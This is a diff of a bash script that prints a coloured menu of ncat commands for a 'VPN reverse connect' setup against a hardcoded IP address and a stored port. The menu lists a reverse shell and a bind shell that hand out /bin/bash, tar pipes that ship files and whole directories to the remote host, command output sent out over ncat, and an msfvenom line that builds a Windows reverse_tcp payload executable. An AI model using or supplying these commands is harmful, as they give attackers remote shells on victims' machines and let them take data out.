@@ -32,26 +32,30 @@ ip=$(echo '193.161.193.99')
 vport=$(cat $HOME/.vf)
 
 echo -e "
-[${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts:${clear}
-[${Green}✔${clear}] ${IYellow}ACCESS TERMINAL${clear}
-\t${IGreen}├──${clear} ${Green}ncat $ip $vport --ssl -e /bin/bash -v ${clear}
-\t${IGreen}└──${clear} ${Green}ncat -l 5576 --ssl -v${clear}
+[${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts: ${clear}
+[${Green}✔${clear}] ${IYellow}ACCESS TERMINAL ${clear}
+\t${IGreen}├──${clear} ${Green}ncat $ip $vport –e /bin/bash ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -lkvp 5576 ${clear}
 
-[${Green}✔${clear}] ${IYellow}SHARE TERMINAL${clear}
+[${Green}✔${clear}] ${IYellow}SHARE TERMINAL ${clear}
 \t${IGreen}├──${clear} ${Green}ncat -v -n $ip $vport ${clear}
-\t${IGreen}└──${clear} ${Green}ncat -k -l -p 5576 -e /bin/bash${clear}
+\t${IGreen}└──${clear} ${Green}ncat -k -l -p 5576 -e /bin/bash ${clear}
 
 [${Green}✔${clear}] ${IYellow}SHARE FILES QUICKLY${clear}
-\t${IGreen}├──${clear} ${Green}ncat $ip $vport < \$PWD/share.EXT${clear}
+\t${IGreen}├──${clear} ${Green}ncat $ip $vport < \$PWD/share.EXT ${clear}
 \t${IGreen}└──${clear} ${Green}ncat -vl -k 5576 > saved ${clear}
 
-[${Green}✔${clear}] ${IYellow}SHARE SUBDIRECTORY QUICKLY${clear}
-\t${IGreen}├──${clear} ${Green}tar -czf - * |ncat $ip $vport${clear}
-\t${IGreen}└──${clear} ${Green}ncat -l 5576 | tar xzvf -${clear}
+[${Green}✔${clear}] ${IYellow}RECEIVE SUBDIRECTORY QUICKLY ${clear}
+\t${IGreen}├──${clear} ${Green}tar zcfP - * | ncat $ip $vport ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 | tar xvpz ${clear}
 
-[${Green}✔${clear}] ${IYellow}USE ANY COMMAND SAVE OUTPUT${clear}
-\t${IGreen}├──${clear} ${Green}uname | ncat $ip $vport${clear}
-\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 > savedout${clear}
+[${Green}✔${clear}] ${IYellow}SEND SUBDIRECTORY QUICKLY ${clear}
+\t${IGreen}├──${clear} ${Green}ncat $ip $vport |tar xvpz ${clear}
+\t${IGreen}└──${clear} ${Green}tar zcfP - *| ncat -l 5576 ${clear}
+
+[${Green}✔${clear}] ${IYellow}USE ANY COMMAND SAVE OUTPUT ${clear}
+\t${IGreen}├──${clear} ${Green}uname | ncat $ip $vport ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 > savedout ${clear}
 
 [${Green}✔${clear}] ${IYellow}METASPLOIT PAYLOADS${clear}
 \t${IGreen}├──${clear} ${Green}msfvenom -p${IGreen} windows/shell/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -f exe > payload-name.exe 
